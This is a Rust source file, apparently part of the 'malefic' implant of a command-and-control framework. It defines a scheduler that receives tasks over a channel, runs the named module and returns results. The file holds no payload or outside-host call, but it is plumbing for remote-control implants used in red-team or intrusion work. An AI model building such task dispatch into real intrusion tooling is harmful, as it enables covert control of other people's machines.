use std::sync::mpsc::{Receiver, Sender};
use anyhow::Result;
use async_std::task;
use malefic_core::common::error::MaleficError;
use malefic_core::manager::manager::MaleficManager;
use malefic_proto::proto::implantpb::{Spite};

pub struct PreludeScheduler {
    pub module_manager: MaleficManager,
    pub task_receiver: Receiver<Spite>, // 用于接受任务
    pub result_sender: Sender<Spite>, // 用于发送任务结果
}

impl PreludeScheduler {  
    pub fn new(task_receiver: Receiver<Spite>, result_sender: Sender<Spite>) -> PreludeScheduler {
        let mut manager = MaleficManager::new();
        let _ = manager.refresh_module();
        PreludeScheduler {
            module_manager: manager,
            task_receiver,
            result_sender,
        }
    }
    
    pub fn get_task_receiver(&self) -> &Receiver<Spite> {
        &self.task_receiver
    }
    
    pub fn get_result_sender(&self) -> Sender<Spite> {
        self.result_sender.clone()
    }

    pub fn handler(&mut self) -> Result<(), MaleficError> {
        loop {
            let receiver = self.get_task_receiver();
            match receiver.recv() {
                Ok(spite) => {
                    let result_spite = task::block_on(self.run(spite))?;
                    self.result_sender.send(result_spite).unwrap();
                }
                Err(_) => {
                    break;
                }
            }
        }

        Ok(())
    }
    
    pub async fn run(&mut self, spite: Spite) -> Result<Spite, MaleficError> {
        let body = match spite.body {
            Some(b) => b,
            None => return Err(MaleficError::MissBody),
        };

        let module = match self.module_manager.get_module(&spite.name) {
            Some(m) => m,
            None => return Err(MaleficError::ModuleNotFound),
        };

        let (input_sender, mut input_receiver) = async_std::channel::bounded(1);
        let (mut output_sender, _) = async_std::channel::bounded(1);

        input_sender.send(body).await.unwrap(); // 异步发送 body
        drop(input_sender); // 确保发送完成后关闭通道

        let result = module.new_instance().run(spite.task_id, &mut input_receiver, &mut output_sender).await?;
        Ok(result.to_spite())
    }
}
